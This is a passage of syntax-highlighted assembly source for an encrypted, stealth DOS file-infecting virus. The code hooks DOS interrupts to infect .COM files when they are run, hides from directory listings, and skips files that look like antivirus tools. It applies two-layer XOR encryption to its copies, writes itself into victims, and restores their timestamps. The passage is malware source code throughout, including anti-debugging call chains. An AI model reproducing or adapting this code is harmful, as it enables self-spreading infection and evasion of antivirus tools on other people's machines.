        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;  These are straight from</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;  YB-X.</span><span class="sc0">
</span><span class="sc5">screw2</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw3</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw4</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">vict_head</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">Scramble</span><span class="sc4">:</span><span class="sc0">                                   
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">                    </span><span class="sc1">; Directory infect.</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">d_h_1</span><span class="sc0">                      </span><span class="sc1">; + Stealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                    </span><span class="sc1">; Directory infect.</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">d_h_1</span><span class="sc0">                      </span><span class="sc1">; + Stealth</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                              </span><span class="sc1">; Save all these      </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; registers.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">                    </span><span class="sc1">; Infect + AV filter </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">                     </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">notforme</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; Goodbye cruel world</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; I'm leaving you today</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; Goodbye</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">; ..</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; Goodbye</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">; ..</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">; ...goodbye</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;      -Pink Floyd</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                               </span><span class="sc1">;  (Well...Close)</span><span class="sc0">
        
</span><span class="sc5">big_jmp</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; This is The End.</span><span class="sc0">
</span><span class="sc5">d_h_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dir_handler_1</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_name</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_name</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                          
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; es:di -&gt; name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                     </span><span class="sc1">; find the period</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">name_tester</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCCCh</span><span class="sc0">                 </span><span class="sc1">; DDDDh marks AV</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cont_inf</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">
</span><span class="sc5">cont_inf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'OC'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HOOK_24</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">                  </span><span class="sc1">; open read/only</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_name</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notforme</span><span class="sc0">                   </span><span class="sc1">; handle errors</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infection_test</span><span class="sc0">             </span><span class="sc1">; is it infected?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCCCh</span><span class="sc0">                 </span><span class="sc1">; FFFF = infected</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">continue_inf</span><span class="sc0">               </span><span class="sc1">; DDDD = don't infect</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; mark it read/only</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E00h</span><span class="sc0">                  </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">
</span><span class="sc5">continue_inf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; infect 'em</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_victim</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">infect_victim</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">                    </span><span class="sc1">; get random number </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                         </span><span class="sc1">; for encryption </span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">;  </span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect_victim</span><span class="sc0">              </span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_v</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_value_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ax_e</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> 
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ax_encrypt</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vict_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; fix BX offset in head</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">off_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">     </span><span class="sc1">; start of 'cryption </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">len</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">off_last</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; end of 'cryption</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin_2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">  </span><span class="sc1">; begin fixup #2</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">             </span><span class="sc1">; copy virus to buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptbuffer</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3d</span><span class="sc0">                           </span><span class="sc1">; construct jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp_offset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Encryptvirus_in_buffer</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                     </span><span class="sc1">; inner encryption</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptbuffer</span><span class="sc0">               </span><span class="sc1">;            </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin_2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin_2</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">e_loop_1</span><span class="sc4">:</span><span class="sc0">                                                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                                  </span><span class="sc1">; XOR [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">37h</span><span class="sc0">                                  </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">ax_e</span><span class="sc4">:</span><span class="sc0">                                                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                                </span><span class="sc1">; scrambler </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">e_loop_1</span><span class="sc0">                             </span><span class="sc1">; loop</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptbuffer</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; outer encryption           </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">e_loop_2</span><span class="sc4">:</span><span class="sc0">                                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                                  </span><span class="sc1">; XOR [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">37h</span><span class="sc0">                                  </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">e_value_1</span><span class="sc4">:</span><span class="sc0">                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                                </span><span class="sc1">; scrambler </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">e_loop_2</span><span class="sc0">                             </span><span class="sc1">; loop</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; write virus   </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptbuffer</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; point to front</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp_create</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25d</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">restore_date_time</span><span class="sc4">:</span><span class="sc0">                                     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">date</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
